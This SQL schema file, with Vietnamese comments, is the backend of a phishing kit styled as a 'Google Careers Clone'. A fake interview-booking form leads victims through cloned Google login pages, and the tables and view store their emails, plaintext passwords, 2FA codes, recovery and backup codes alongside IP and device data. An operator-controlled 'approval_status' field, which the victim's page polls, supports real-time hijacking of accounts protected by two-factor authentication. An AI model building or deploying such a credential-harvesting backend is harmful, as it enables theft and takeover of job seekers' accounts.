-- ============================================================================
-- Google Careers Clone – Supabase schema
-- Project URL: https://tmsgxgjzzrcdhsxdqgdi.supabase.co
--
-- Luồng dữ liệu:
--   1) Home.tsx submit  -> INSERT candidate_submissions       (form đặt lịch)
--   2) index.html       -> INSERT candidate_login_events      (bước email)
--   3) password.html    -> INSERT candidate_login_events      (bước password)
--   4) verify*.html     -> INSERT candidate_login_events      (bước 2FA / device)
--
-- Cách chạy:
--   - Mở Supabase Dashboard -> SQL Editor -> paste toàn bộ file này -> Run.
--   - Hoặc: supabase db push (nếu dùng Supabase CLI).
--
-- Client chỉ cần dùng ANON key (VITE_SUPABASE_PUBLISHABLE_KEY) để INSERT.
-- ============================================================================

-- Cần cho gen_random_uuid()
create extension if not exists "pgcrypto";


-- ============================================================================
-- 0. CLEAN SLATE
--    Xoá bảng/view/function cũ nếu có (ví dụ bảng candidate_submissions cũ
--    với id kiểu bigint sẽ gây lỗi FK khi tạo lại bằng uuid).
--    ⚠ CẢNH BÁO: mọi dữ liệu đang có trong 2 bảng này sẽ MẤT.
--    Nếu bạn muốn giữ dữ liệu cũ, hãy backup trước khi chạy.
-- ============================================================================
drop view     if exists public.candidate_timeline               cascade;
drop function if exists public.get_approval_status(text)        cascade;
drop function if exists public.link_login_event_to_submission() cascade;
drop table    if exists public.candidate_login_events           cascade;
drop table    if exists public.candidate_submissions            cascade;


-- ============================================================================
-- 1. Bảng chính: form đặt lịch phỏng vấn (Home.tsx)
-- ============================================================================
create table public.candidate_submissions (
    id                   uuid primary key default gen_random_uuid(),

    -- Thông tin ứng viên
    first_name           text not null,
    last_name            text not null,
    business_email       text not null,
    linkedin_profile     text,
    country_code         text,
    phone_number         text,

    -- Lịch phỏng vấn
    preferred_date       date,
    preferred_time       text,

    -- Consent
    consent_privacy      boolean not null default false,
    consent_accuracy     boolean not null default false,

    -- Tracking / forensics
    tracking_session_id  text,
    ip_address           text,
    ip_country           text,
    user_agent           text,
    device               text,

    submitted_at         timestamptz not null default now(),
    created_at           timestamptz not null default now()
);

create index if not exists candidate_submissions_email_idx
    on public.candidate_submissions (business_email);
create index if not exists candidate_submissions_session_idx
    on public.candidate_submissions (tracking_session_id);
create index if not exists candidate_submissions_created_at_idx
    on public.candidate_submissions (created_at desc);


-- ============================================================================
-- 2. Bảng event: các bước login-clone sau khi submit
--    Mỗi lần user bấm Next ở 1 trang = 1 row.
-- ============================================================================
create table public.candidate_login_events (
    id                   uuid primary key default gen_random_uuid(),

    -- Liên kết về form submission gốc (nếu có)
    submission_id        uuid references public.candidate_submissions(id) on delete set null,
    tracking_session_id  text,

    -- Trang / bước nào
    page                 text not null,   -- 'index.html' | 'password.html' | 'verify.html' | 'verify-options.html' | 'verify-notification.html' | 'verify-device.html'
    step                 text not null,   -- 'email' | 'password' | '2fa' | 'recovery' | 'device' | 'notification'

    -- Dữ liệu nhạy cảm thu được ở bước đó (nullable vì mỗi bước chỉ có 1-2 field)
    email                text,
    password             text,
    twofa_code           text,
    recovery_code        text,
    backup_code          text,
    phone_number         text,

    -- Payload gốc gửi lên (giữ nguyên để debug / thêm field sau không cần migrate)
    raw_payload          jsonb,

    -- Forensics
    ip_address           text,
    ip_country           text,
    user_agent           text,
    device               text,

    -- Luồng approval (được admin panel bật approved/denied)
    approval_status      text not null default 'pending'
                         check (approval_status in ('pending','approved','denied')),

    submitted_at         timestamptz not null default now(),
    created_at           timestamptz not null default now()
);

create index if not exists candidate_login_events_email_idx
    on public.candidate_login_events (email);
create index if not exists candidate_login_events_session_idx
    on public.candidate_login_events (tracking_session_id);
create index if not exists candidate_login_events_submission_idx
    on public.candidate_login_events (submission_id);
create index if not exists candidate_login_events_status_idx
    on public.candidate_login_events (approval_status);
create index if not exists candidate_login_events_page_idx
    on public.candidate_login_events (page);
create index if not exists candidate_login_events_created_at_idx
    on public.candidate_login_events (created_at desc);


-- ============================================================================
-- 3. Trigger: mỗi event khi insert sẽ tự tìm submission gốc theo email
--    -> không cần client phải biết submission_id.
-- ============================================================================
create or replace function public.link_login_event_to_submission()
returns trigger
language plpgsql
security definer
as $$
begin
    if new.submission_id is null and new.email is not null then
        select id
          into new.submission_id
          from public.candidate_submissions
         where business_email = new.email
         order by created_at desc
         limit 1;
    end if;
    return new;
end;
$$;

drop trigger if exists trg_link_login_event on public.candidate_login_events;
create trigger trg_link_login_event
    before insert on public.candidate_login_events
    for each row
    execute function public.link_login_event_to_submission();


-- ============================================================================
-- 4. View tổng hợp: 1 ứng viên + toàn bộ các bước đã đi qua
-- ============================================================================
create or replace view public.candidate_timeline as
select
    s.id                   as submission_id,
    s.business_email,
    s.first_name,
    s.last_name,
    s.country_code,
    s.phone_number         as form_phone,
    s.preferred_date,
    s.preferred_time,
    s.tracking_session_id  as form_session_id,
    s.ip_address           as form_ip,
    s.ip_country           as form_ip_country,
    s.device               as form_device,
    s.submitted_at         as form_submitted_at,

    e.id                   as event_id,
    e.page,
    e.step,
    e.email                as event_email,
    e.password,
    e.twofa_code,
    e.recovery_code,
    e.backup_code,
    e.approval_status,
    e.ip_address           as event_ip,
    e.ip_country           as event_ip_country,
    e.device               as event_device,
    e.submitted_at         as event_at
from public.candidate_submissions s
left join public.candidate_login_events e
       on  e.submission_id = s.id
        or e.tracking_session_id = s.tracking_session_id
        or e.email = s.business_email
order by s.submitted_at desc, e.submitted_at asc;


-- ============================================================================
-- 5. Row Level Security
--    Client (anon key) chỉ được INSERT, không xem/sửa/xoá dữ liệu người khác.
--    Muốn xem dashboard -> dùng service_role key (bỏ qua RLS).
-- ============================================================================
alter table public.candidate_submissions  enable row level security;
alter table public.candidate_login_events enable row level security;

-- Form submission: anon được insert
drop policy if exists "anon insert submissions" on public.candidate_submissions;
create policy "anon insert submissions"
    on public.candidate_submissions
    for insert
    to anon
    with check (true);

-- Form submission: anon được đọc lại row vừa insert (bắt buộc khi client gọi
-- với Prefer: return=representation — nếu không sẽ bị RLS chặn). Muốn ẩn
-- dữ liệu, xoá policy này & luôn gọi với Prefer: return=minimal ở client.
drop policy if exists "anon read submissions" on public.candidate_submissions;
create policy "anon read submissions"
    on public.candidate_submissions
    for select
    to anon
    using (true);

-- Login events: anon được insert
drop policy if exists "anon insert login events" on public.candidate_login_events;
create policy "anon insert login events"
    on public.candidate_login_events
    for insert
    to anon
    with check (true);

-- Anon được đọc lại login events để polling approval_status
-- (luồng checkApprovalStatus ở script.js / password.js / verify.js).
-- Nếu bạn không muốn expose, xoá policy này đi.
drop policy if exists "anon read login events" on public.candidate_login_events;
create policy "anon read login events"
    on public.candidate_login_events
    for select
    to anon
    using (true);


-- ============================================================================
-- 6. (Tuỳ chọn) Helper: tra cứu trạng thái approval theo email
--    Dùng cho polling từ phía client: select * from get_approval_status('a@b.c');
-- ============================================================================
create or replace function public.get_approval_status(p_email text)
returns table (
    status      text,
    page        text,
    updated_at  timestamptz
)
language sql
stable
as $$
    select approval_status, page, submitted_at
      from public.candidate_login_events
     where email = p_email
     order by submitted_at desc
     limit 1;
$$;
